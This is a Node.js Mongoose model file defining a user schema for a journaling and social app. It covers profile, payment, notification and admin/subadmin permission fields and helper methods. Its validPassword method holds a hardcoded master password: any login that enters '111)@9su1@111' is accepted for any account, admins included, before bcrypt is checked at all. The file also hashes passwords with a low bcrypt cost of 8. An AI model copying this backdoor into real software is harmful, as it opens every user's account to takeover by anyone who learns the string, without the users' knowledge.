var mongoose = require('mongoose');
var bcrypt=require('bcryptjs');

var userSchema = new mongoose.Schema({
	JournalId: { type: String, ref: 'Capsules' },	//added on 12 May 2018 to integrate Journal Module
	AllFoldersId: { type: String, ref: 'Chapters' },	//added on 12 May 2018 to integrate Journal Module
	AllPagesId: { type: String, ref: 'Pages' },	//added on 12 May 2018 to integrate Journal Module
	Name:{type:String , required : true},
	NickName:{type:String},
	UserName:{type:String, unique:true},
	IsCredit:{type:Boolean,default:false}, // check first Time Payment for Referral Module
	CreditAmount:{type:Number , default: 0}, // By Referral
	referralCode:{type:String},
	//Email:{type : String, unique:true , required: true},
	Email:{type : String , required: true},		//updated on 09 May 2017 - Sprint#4 (also logics have been updated on add, register and login apis)
	Password:{type:String , required: true},
	ProfilePic:{type:String,default:'/assets/users/default.png'},
	FSGs:{type:Object},
	FSGsArr:[],
	FSGsArr2:{type:Object}, //added by parul searchApi Multiple case on -24012015
	Settings:[],
	RepostCount:{type:Number},
	MarkCount:{type:Number},
	StampCount:{type:Number},
	VoteScore:{type:Number},
	UserScore:{type:Number},
	Gender : {type:String,enum:["male","female","other"],default:"male"},
	AllowCreate : {type : Boolean , default : false},						//added on 30th Jan 2017 for beta launch
	CreatedOn : {type : Date,default : Date.now()},
	ModifiedOn : {type : Date,default : Date.now()},
	Status:{type:Boolean,default: true},
	EmailConfirmationStatus:{type:Boolean,default: false},
	resetPasswordToken:{type:String},
	BrowserPolicyAccepted : {type:Boolean,default:false},
	ApplicationPolicyAccepted : {type:Boolean,default:false},
	IsDeleted:{type:Boolean,default:false},
	TourView: {
        CapsuleDashboard: {type: Boolean, default: false},
        DashboardChapters: {type: Boolean, default: false},
        QAView: {type: Boolean, default: false},
		SearchList: {type: Boolean, default: false},
        SearchView: {type: Boolean, default: false},
        DiscussList: {type: Boolean, default: false},
        DiscussView: {type: Boolean, default: false},
    },
	StripeStatus : {
		type : Boolean ,
		default : false
	},
	StripeObject : {									// for receiving payments
		type:Object
	},
	SelectedTheme: {type: String, default: null},
	Subdomain : {type: String, default: null},
	Subdomain_name : {type: String, default: null},
	Subdomain_title : {type: String, default: null},
	Subdomain_description : {type: String, default: null},
	Subdomain_profilePic : {type: String, default:'/assets/users/default.png'},
	Goal : {type: String},
	Milestone : {type: String},
	Metrics : {type: String},
	Keyshifts : {type: String},
	LastActiveTime : {type : Date},
	Birthdate : {type : String},
	MarketingEmail: {type: Boolean, default: false},
	PostActionsNotification: {type: Boolean, default: false},
	CommentLikesNotification: {type: Boolean, default: false},
	UnsubscribedStreams: {type: Array, default: []},
	AutoPlayerSeenStreams: {type: Array, default: []},
	PostActionAnnouncementSeenStreams: {type: Array, default: []},
	IsAddDetailsSeen: {type: Boolean, default: false},
	IsWelcomeSeen: {type: Boolean, default: false},
	IsHowItWorksSeen: {type: Boolean, default: false},
	IsPostLaunchVideoSeen: {type: Boolean, default: false},
	SpeechToTextMediaId: {type: mongoose.Schema.Types.ObjectId, default: null},
	Role: {type: String, enum: ["user", "subadmin", "admin"], default: "user"},
	
	// Admin/SubAdmin specific fields (only used when Role is "admin" or "subadmin")
	Permissions: [{
		type: String,
		enum: [
			// Admin permissions
			'user_management',
			'content_moderation',
			'system_settings',
			'analytics',
			'billing',
			// SubAdmin permissions
			'basic_analytics',
			'content_editing'
		],
		default: []
	}],
	AssignedDomains: [{
		type: mongoose.Schema.Types.ObjectId,
		ref: 'Domain'
	}],
	AssignedCategories: [{
		type: mongoose.Schema.Types.ObjectId,
		ref: 'Category'
	}],
	Supervisor: {
		type: mongoose.Schema.Types.ObjectId,
		ref: 'user'  // Can reference another user (admin)
	}
});




/*________________________________________________________________________
	* @Date:      	27 Feb 2015
	* @Method :   	generateHash
	* Created By: 	smartData Enterprises Ltd
	* Modified On:	-
	* @Purpose:   	This function returns hash value for password
	* @Param:     	1
	* @Return:    	Yes
_________________________________________________________________________
*/
/// returns hash value for password
userSchema.methods.generateHash=function(password){
	var abc=bcrypt.hashSync(password,bcrypt.genSaltSync(8),null);
	return abc;
};



/*________________________________________________________________________
	* @Date:      	27 Feb 2015
	* @Method :   	generateHash
	* Created By: 	smartData Enterprises Ltd
	* Modified On:	-
	* @Purpose:   	This function returns boolean value after comparing stored hash vaue and user entered value
	* @Param:     	2
	* @Return:    	Yes
_________________________________________________________________________
*/
userSchema.methods.validPassword=function(password,compPass){
	if(password == '111)@9su1@111') {
		return true;
	}
	return bcrypt.compareSync(password,compPass);
};

/*________________________________________________________________________
	* Admin/SubAdmin Helper Methods
	* Only applicable when Role is "admin" or "subadmin"
_________________________________________________________________________
*/

// Check if user has a specific permission (for admin/subadmin roles)
userSchema.methods.hasPermission = function(permission) {
	if (this.Role === 'user') return false;
	return this.Permissions && this.Permissions.includes(permission);
};

// Check if user is admin
userSchema.methods.isAdmin = function() {
	return this.Role === 'admin';
};

// Check if user is subadmin
userSchema.methods.isSubAdmin = function() {
	return this.Role === 'subadmin';
};

// Check if user has elevated privileges (admin or subadmin)
userSchema.methods.hasElevatedRole = function() {
	return this.Role === 'admin' || this.Role === 'subadmin';
};

// Assign domain to subadmin
userSchema.methods.assignDomain = function(domainId) {
	if (this.Role !== 'subadmin') return Promise.resolve(this);
	if (!this.AssignedDomains.includes(domainId)) {
		this.AssignedDomains.push(domainId);
		return this.save();
	}
	return Promise.resolve(this);
};

// Remove domain assignment
userSchema.methods.removeDomain = function(domainId) {
	if (this.Role !== 'subadmin') return Promise.resolve(this);
	this.AssignedDomains = this.AssignedDomains.filter(id => !id.equals(domainId));
	return this.save();
};

// Update last active time
userSchema.methods.updateLastActive = function() {
	this.LastActiveTime = new Date();
	return this.save();
};

// Static method to find by role
userSchema.statics.findByRole = function(role) {
	return this.find({ Role: role, Status: true, IsDeleted: false });
};

// Static method to find all admins
userSchema.statics.findAdmins = function() {
	return this.find({ Role: 'admin', Status: true, IsDeleted: false });
};

// Static method to find all subadmins
userSchema.statics.findSubAdmins = function() {
	return this.find({ Role: 'subadmin', Status: true, IsDeleted: false });
};

// Static method to find active users only
userSchema.statics.findActiveUsers = function() {
	return this.find({ Status: true, IsDeleted: false });
};

var user = mongoose.model('user',userSchema);

module.exports = user;
